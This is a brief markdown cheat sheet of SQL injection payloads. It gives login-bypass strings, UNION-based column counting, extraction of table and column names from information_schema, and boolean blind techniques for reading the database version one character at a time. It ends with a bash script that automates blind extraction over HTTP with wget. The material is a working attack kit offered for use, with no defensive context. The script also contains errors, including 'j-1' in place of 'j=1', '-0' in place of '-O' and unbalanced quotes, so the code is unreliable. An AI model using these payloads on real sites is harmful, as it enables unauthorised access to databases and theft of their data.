# SQL Injection

## Basic

```bash
' or 1=1-- -
' or '1'='1
test' and 'a'='a
test' and 'a'='ab
```

## UNION

Find the number of fields with visible changes  

```bash
' union select null-- -
# increase the number of nulls until no error is provided
' union select null,null,null,null,null,null-- -
# sometimes a specific field requires an int or a string, you may need to play with that
```

Find the number of columns with no visible changes  

```bash
' order by 1-- -
# increase this number until either an error or some other change occurs
```

Extract data  

```bash
' union select table_name, column_name, null,null,null from information_schema.columns-- -
```


## Blind Injections

Use TRUE and FALSE conditions  

If only an ID of 1 exists:  

```bash
1' and 'a'='a   # TRUE
1' and 'a'='b   # FALSE
```

Extract information 1 character at a time

```bash
1' and substring(@@version,1,1)='1    # FALSE
# increment the last number until the true condition appears
1' and substring(@@version,1,1)='5    # TRUE
```

When you hit a true statement, increment the position argument of the substring funtion  

```bash
1' and substring(@@version,2,1)='1    # FALSE
# Increment the last number until the true condition appears
```

This bash script can help with automation. Otherwise, use sqlmap  

```bash
#!/bin/bash

charset=`echo {0..9} {A..z} \. \: \, \; \- \_ \@`

export URL=""
export truestring=""
export maxlength=$1
export query=$2

export result=""

echo "Extracting the results for $query..."

for ((j-1;j<$maxlength;j+=1))
do
  export nthchar=$j
  
  for i in $charset
  do
    wget "$URL?id=1' and substring(($query),$nthchar,1)='$i' -q -0 - | grep "$truestring" &> /dev/null
    if [ "$?" == "0" ]
    then
      echo Character number $nthchar found: $i
      export result+=$i
      break
    fi
  done
done

echo Result: $result
```
